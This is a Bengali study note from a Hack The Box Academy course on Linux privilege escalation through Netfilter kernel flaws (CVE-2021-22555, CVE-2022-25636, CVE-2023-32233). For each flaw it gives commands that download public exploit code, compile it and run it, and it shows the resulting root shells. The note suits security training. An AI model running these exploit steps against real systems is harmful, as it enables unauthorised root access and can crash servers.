# Netfilter - [LINK](https://academy.hackthebox.com/app/module/51/section/1598)


নেটফিল্টার (Netfilter) হলো লিনাক্স কার্নেলের একটি অত্যন্ত গুরুত্বপূর্ণ মডিউল। এটি মূলত প্যাকেট ফিল্টারিং, নেটওয়ার্ক অ্যাড্রেস ট্রান্সলেশন (NAT) এবং ফায়ারওয়ালের অন্যান্য কাজের জন্য ব্যবহৃত হয়। যখন কোনো নেটওয়ার্ক প্যাকেট লিনাক্স সিস্টেমে আসে বা যায়, নেটফিল্টার সেই প্যাকেটগুলোকে চেক করে এবং এর নিয়ম অনুযায়ী নিয়ন্ত্রণ করে। লিনাক্সের জনপ্রিয় ফায়ারওয়াল টুল যেমন `iptables` বা `arptables` মূলত এই নেটফিল্টার সিস্টেমের ওপর ভিত্তি করেই কাজ করে।

এই কার্নেল মডিউলটির প্রধান তিনটি কাজ হলো:
১. প্যাকেট ডিফ্র্যাগমেন্টেশন (Packet defragmentation)
২. কানেকশন ট্র্যাকিং (Connection tracking)
৩. নেটওয়ার্ক অ্যাড্রেস ট্রান্সলেশন (NAT)

যেহেতু নেটফিল্টার সরাসরি কার্নেলের সাথে যুক্ত, তাই এর কোনো দুর্বলতা ব্যবহার করে খুব সহজেই সিস্টেমের রুট (Root) পারমিশন নেওয়া যায়।

## কোম্পানিগুলো কেন পুরোনো সিস্টেম ব্যবহার করে?

অনেক কোম্পানি তাদের তৈরি করা নির্দিষ্ট সফটওয়্যারের সাথে সামঞ্জস্য রেখে লিনাক্স ডিস্ট্রিবিউশন কাস্টমাইজ করে। এখন যদি তারা লিনাক্স সিস্টেম আপডেট করে, তবে তাদের সফটওয়্যার কাজ করা বন্ধ করে দিতে পারে। পুরো সফটওয়্যার নতুন করে আপডেট করা অনেক সময়সাপেক্ষ ও ব্যয়বহুল। এই কারণে তারা প্রডাকশনে পুরোনো এবং আপডেট না করা লিনাক্স সিস্টেম ব্যবহার করে, যা প্রিভিলেজ এসকালেশনের সুযোগ তৈরি করে দেয়।

এমনকি যদি তারা ডকার (Docker) কন্টেইনার ব্যবহার করে অ্যাপ্লিকেশন আইসোলেট (আলাদা) করে রাখে, তবুও কন্টেইনারগুলো মেইন হোস্ট মেশিনের কার্নেল শেয়ার করে। তাই কার্নেলের দুর্বলতা (যেমন নেটফিল্টার এক্সপ্লয়ট) ব্যবহার করে কন্টেইনার ভেঙে মেইন সিস্টেমের রুট হওয়া সম্ভব।

## ১. CVE-2021-22555

এটি নেটফিল্টারের একটি মারাত্মক দুর্বলতা যা লিনাক্স কার্নেল **২.৬ থেকে ৫.১১** পর্যন্ত ভার্সনগুলোতে কাজ করে।

**এক্সপ্লয়টেশন পদ্ধতি:**
প্রথমে কার্নেল ভার্সন চেক করে এক্সপ্লয়টটি ডাউনলোড ও কম্পাইল করতে হবে।

```bash
cry0l1t3@ubuntu:~$ uname -r
5.10.5-051005-generic

cry0l1t3@ubuntu:~$ wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
cry0l1t3@ubuntu:~$ gcc -m32 -static exploit.c -o exploit

```

এরপর এক্সপ্লয়টটি রান করলেই মেমোরি করাপশন (Memory corruption) ট্রিগার হবে এবং রুট শেল পাওয়া যাবে।

```bash
cry0l1t3@ubuntu:~$ ./exploit
...SNIP...
# id
uid=0(root) gid=0(root) groups=0(root)

```

## ২. CVE-2022-25636

এই দুর্বলতাটি লিনাক্স কার্নেল **৫.৪ থেকে ৫.৬.১০** পর্যন্ত ভার্সনে কাজ করে। এটি মূলত `net/netfilter/nf_dup_netdev.c` ফাইলে থাকা একটি "Heap Out-of-Bounds Write" দুর্বলতা।

**সতর্কতা:** এই এক্সপ্লয়টটি রান করার সময় খুব সাবধান থাকতে হয়, কারণ এটি কার্নেলকে করাপ্ট বা ক্র্যাশ করে দিতে পারে, যার ফলে সার্ভার রিবুট করার প্রয়োজন হতে পারে।

**এক্সপ্লয়টেশন পদ্ধতি:**

```bash
cry0l1t3@ubuntu:~$ uname -r
5.13.0-051300-generic

cry0l1t3@ubuntu:~$ git clone https://github.com/Bonfee/CVE-2022-25636.git
cry0l1t3@ubuntu:~$ cd CVE-2022-25636
cry0l1t3@ubuntu:~$ make
cry0l1t3@ubuntu:~$ ./exploit

```

কোডটি রান করলে এটি মেমোরিতে নির্দিষ্ট কিছু কাজ করে রুট শেল এনে দেবে।

```bash
# id
uid=0(root) gid=0(root) groups=0(root)

```

## ৩. CVE-2023-32233

এটি তুলনামূলকভাবে নতুন একটি দুর্বলতা যা লিনাক্স কার্নেল **৬.৩.১** ভার্সন পর্যন্ত কাজ করে। এটি নেটফিল্টারের `nf_tables` এ থাকা "Use-After-Free" দুর্বলতা কাজে লাগায়।

**মেকানিজম:**
`nf_tables` ব্যাচ রিকোয়েস্ট প্রসেস করার জন্য কিছু অস্থায়ী স্পেস (anonymous sets) তৈরি করে। কাজ শেষে এই স্পেসগুলো ক্লিয়ার করে দেওয়ার কথা, যাতে এগুলো আর ব্যবহার করা না যায়। কিন্তু কোডের ভুলের কারণে এগুলো ঠিকমতো ক্লিয়ার হয় না। অ্যাটাকাররা এই ফেলে দেওয়া বা ক্লিয়ার করা মেমোরি স্পেসগুলো (Use-After-Free) পুনরায় ব্যবহার করে কার্নেলের মেমোরি ম্যানিপুলেট করে এবং রুট প্রিভিলেজ পেয়ে যায়।

**এক্সপ্লয়টেশন পদ্ধতি:**

```bash
cry0l1t3@ubuntu:~$ git clone https://github.com/Liuk3r/CVE-2023-32233
cry0l1t3@ubuntu:~$ cd CVE-2023-32233
cry0l1t3@ubuntu:~/CVE-2023-32233$ gcc -Wall -o exploit exploit.c -lmnl -lnftnl

```

কম্পাইল শেষে এক্সপ্লয়টটি রান করলে এটি প্রসেসরের স্পেসিফিক কোর ব্যবহার করে মেমোরি রেস কন্ডিশন (Race condition) তৈরি করে রুট শেল নিয়ে আসে।

```bash
cry0l1t3@ubuntu:~/CVE-2023-32233$ ./exploit
...SNIP...
[*] You've Got ROOT:-)

# id
uid=0(root) gid=0(root) groups=0(root)

```

কার্নেল লেভেলের এক্সপ্লয়টগুলো (বিশেষ করে মেমোরি করাপশন বা Use-After-Free) খুবই আনস্টেবল (অস্থির) হয়। রিয়েল লাইফ পেনিট্রেশন টেস্টিংয়ে এগুলো রান করলে প্রোডাকশন সার্ভার ক্র্যাশ করার বিশাল ঝুঁকি থাকে। তাই খুব প্রয়োজন না হলে এগুলো ব্যবহার করা উচিত নয়।
